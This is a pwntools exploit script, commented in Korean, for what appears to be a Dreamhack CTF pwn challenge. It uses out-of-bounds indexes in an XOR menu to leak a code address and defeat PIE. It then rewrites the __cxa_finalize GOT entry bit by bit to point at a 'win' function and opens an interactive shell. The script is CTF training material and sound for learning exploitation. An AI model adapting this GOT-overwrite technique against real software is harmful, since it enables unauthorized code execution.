from pwn import *
context.arch="amd64"
context.log_level='debug'
#context.terminal = ['tmux', 'splitw', '-h']

p = remote("host8.dreamhack.games",22989)
#p = process("./main")
#gdb.attach(p)
e = ELF("./main")

p.recvuntil(b"> ")
p.sendline(b"1") # XOR
p.recvuntil(b"Enter i & j >")
p.sendline(b"65 65") # arr[65] 초기화

p.recvuntil(b"> ")
p.sendline(b"1") # XOR
p.recvuntil(b"Enter i & j >")
p.sendline(b"65 -85") # arr[65] = __do_global_dtors_aux

p.recvuntil(b"> ")
p.sendline(b"2") # print value
p.recvuntil(b"Enter i > ")
p.sendline(b"65") # choose arr[65]
p.recvuntil(b"Value: ")
leaked_line = p.recvline()
dtors_address = int(leaked_line.strip(), 16)
e.address = dtors_address - 0x11a0
win = e.symbols['win']

log.info(f"dtors 주소 {hex(dtors_address)}")
log.info(f"win {hex(win)}")
log.info(f"win 바이너리로 {bin(win)}")

p.recvuntil(b"> ")
p.sendline(b"1") # XOR
p.recvuntil(b"Enter i & j >")
p.sendline(b"-9 -9")# __cxa_finalize@got 초기화

for i in range(63,-1,-1):
    if((win>>i) & 1): #win의 i번째 비트가 1인지 확인
        log.info(f"{i}번째 비트 1 확인")
        p.recvuntil(b"> ")
        p.sendline(b"1") # XOR
        p.recvuntil(b"Enter i & j >")
        p.sendline(f"-9 {i}".encode())# __cxa_finalize@got^=2**(64-1)

p.recvuntil(b"> ")
p.sendline(b"3") # print value
p.sendline(b"ls") # print value
p.interactive()
